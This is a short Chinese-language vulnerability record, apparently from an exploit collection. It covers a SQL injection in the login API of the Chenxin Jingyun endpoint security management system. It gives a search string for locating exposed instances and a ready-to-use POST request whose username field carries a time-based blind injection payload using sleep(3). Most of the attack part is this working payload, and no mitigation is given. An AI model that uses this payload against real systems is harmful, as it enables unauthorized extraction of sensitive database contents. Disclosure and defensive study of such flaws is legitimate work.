# 辰信领创 辰信景云终端安全管理系统 login SQL注入漏洞

## 漏洞描述

辰信领创 辰信景云终端安全管理系统 login存在 SQL注入漏洞，攻击者通过漏洞可以获取数据库敏感信息

## 漏洞影响

<a-checkbox checked>辰信领创 辰信景云终端安全管理系统</a-checkbox></br>

## 网络测绘

<a-checkbox checked>"辰信景云终端安全管理系统"</a-checkbox></br>

## 漏洞复现、

登录页面

![img](../../../.vuepress/public/img/1653535043300-0848f113-f483-47b4-bd33-305485f46ae8.png)

验证POC

```java
POST /api/user/login

captcha=&password=21232f297a57a5a743894a0e4a801fc3&username=admin'and(select*from(select+sleep(3))a)='
```

![img](../../../.vuepress/public/img/1653535112545-1861e3cf-b0ac-4a04-9851-3b6ccb377bd1.png)